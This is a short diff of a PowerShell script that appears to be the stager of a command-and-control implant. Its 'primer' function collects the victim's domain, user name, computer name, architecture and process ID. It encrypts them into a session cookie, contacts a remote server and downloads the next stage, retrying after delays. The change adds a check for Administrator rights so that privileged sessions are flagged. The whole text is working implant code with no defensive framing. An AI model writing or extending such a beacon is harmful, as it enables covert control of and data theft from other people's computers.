@@ -66,7 +66,11 @@ $wc.Proxy.Credentials = $wc.Credentials;
 } if ($cookie) { $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie") }
 $wc }
 function primer {
-try{$u=([Security.Principal.WindowsIdentity]::GetCurrent()).name} catch{if ($env:username -eq "$($env:computername)$"){}else{$u=$env:username}}
+$cu = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+$wp = New-Object System.Security.Principal.WindowsPrincipal($cu)
+$ag = [System.Security.Principal.WindowsBuiltInRole]::Administrator
+if ($wp.IsInRole($ag)){$el="*"}else{$el=""}
+try{$u=($cu).name+$el} catch{if ($env:username -eq "$($env:computername)$"){}else{$u=$env:username}}
 $o="$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;#REPLACEHOSTPORT#"
 try {$pp=enc -key #REPLACEKEY# -un $o} catch {$pp="ERROR"}
 $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
@@ -78,6 +82,3 @@ Start-Sleep 300
 try {primer} catch {}
 Start-Sleep 600
 try {primer} catch {}
-
-
-
